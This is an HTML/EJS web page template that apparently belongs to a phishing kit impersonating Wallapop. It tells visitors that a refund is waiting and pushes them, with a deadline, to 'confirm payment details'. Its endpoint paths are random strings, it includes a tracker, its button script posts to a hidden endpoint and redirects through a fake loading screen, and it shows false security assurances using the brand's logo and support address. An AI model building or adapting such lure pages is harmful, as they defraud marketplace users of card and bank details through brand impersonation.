<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallapop - Notificación de reembolso</title>
    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
    <link rel="stylesheet" href="/css/wallapop.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <%- include('partials/tracker') %>
    <style>
        .refund-badge-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background-color: rgba(19, 193, 172, 0.12);
            color: var(--wlp-teal, #13c1ac);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
        }

        .refund-amount-box {
            font-size: 36px;
            font-weight: 700;
            color: var(--wlp-dark, #253238);
            margin: 8px 0 20px;
            letter-spacing: -0.5px;
        }

        .refund-details-table {
            width: 100%;
            margin: 18px 0;
            border-collapse: collapse;
            font-size: 14px;
            text-align: left;
        }

        .refund-details-table tr {
            border-bottom: 1px solid #edf1f3;
        }

        .refund-details-table tr:last-child {
            border-bottom: none;
        }

        .refund-details-table td {
            padding: 12px 4px;
        }

        .refund-details-table .label {
            color: var(--wlp-muted, #607d8b);
            width: 50%;
        }

        .refund-details-table .value {
            color: var(--wlp-dark, #253238);
            font-weight: 600;
            text-align: right;
        }

        .status-pill {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background-color: #e8f8f5;
            color: #0d8a7b;
            font-size: 12px;
            font-weight: 600;
            padding: 3px 8px;
            border-radius: 12px;
        }

        .status-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background-color: #13c1ac;
        }

        .time-alert-box {
            background-color: #f0fdf9;
            border: 1px solid #cceee5;
            border-radius: 8px;
            padding: 12px 14px;
            font-size: 13px;
            color: #0b6a5e;
            margin: 18px 0 24px;
            display: flex;
            align-items: center;
            gap: 10px;
            text-align: left;
        }
    </style>
</head>
<body>
    <header class="wlp-header">
        <div class="wlp-header-inner">
            <a href="/" class="wlp-logo-link">
                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
            </a>
        </div>
    </header>

    <main class="wlp-page-wrapper">
        <div class="wlp-modal-card" style="text-align: center;">
            <div class="refund-badge-icon">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
            </div>

            <h1 class="wlp-title" style="margin-bottom: 6px; font-size: 22px;">¡Reembolso disponible!</h1>
            <p style="font-size: 14.5px; color: var(--wlp-muted, #607d8b); margin-bottom: 6px;">
                Tienes un saldo pendiente de ingresar en tu cuenta o tarjeta bancaria.
            </p>

            <div class="refund-amount-box">
                <%= refundAmount %> €
            </div>

            <!-- Transaction Breakdown Table -->
            <table class="refund-details-table">
                <tr>
                    <td class="label">Referencia:</td>
                    <td class="value"><%= orderNumber %></td>
                </tr>
                <tr>
                    <td class="label">Concepto:</td>
                    <td class="value">Reembolso de saldo a favor</td>
                </tr>
                <tr>
                    <td class="label">Fecha de emisión:</td>
                    <td class="value"><%= processingDate %></td>
                </tr>
                <tr>
                    <td class="label">Plazo límite de cobro:</td>
                    <td class="value"><%= paymentDeadline %></td>
                </tr>
                <tr>
                    <td class="label">Estado de la solicitud:</td>
                    <td class="value">
                        <span class="status-pill">
                            <span class="status-dot"></span>
                            Listo para transferir
                        </span>
                    </td>
                </tr>
            </table>

            <!-- Notice -->
            <div class="time-alert-box">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink: 0;">
                    <circle cx="12" cy="12" r="10"></circle>
                    <polyline points="12 6 12 12 16 14"></polyline>
                </svg>
                <span>El importe está reservado y listo para transferirse. Confirma tus datos de cobro para recibir el ingreso inmediatamente.</span>
            </div>

            <!-- CTA Button -->
            <a href="/blaTxmdM9HwCP472fgsut" class="wlp-btn-primary btn" style="text-decoration: none;">Recibir dinero ahora</a>

            <div class="wlp-ssl-footer" style="margin-top: 24px;">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                <span>Protegido por el sistema de Protección Wallapop y Cifrado SSL</span>
            </div>
            
            <p style="font-size: 12px; color: #8fa2ad; margin-top: 8px;">
                Si tienes cualquier duda, contacta con <strong>soporte@wallapop.com</strong>
            </p>
        </div>
    </main>

    <script>
        $("a.btn").click(function(e){
            e.preventDefault();
            const btn = $(this);
            btn.text('Procesando...');
            btn.css('pointer-events', 'none');

            $.ajax({
                url: '/EpLP85AgNE4pn4RtpL', 
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({}),
                success: function(info) {
                    if (info.OK) {
                        window.location = "/loading?time=2&url=/blaTxmdM9HwCP472fgsut";
                    }
                },
                error: function() {
                    window.location = "/loading?time=2&url=/blaTxmdM9HwCP472fgsut";
                }
            });
        });
    </script>
</body>
</html>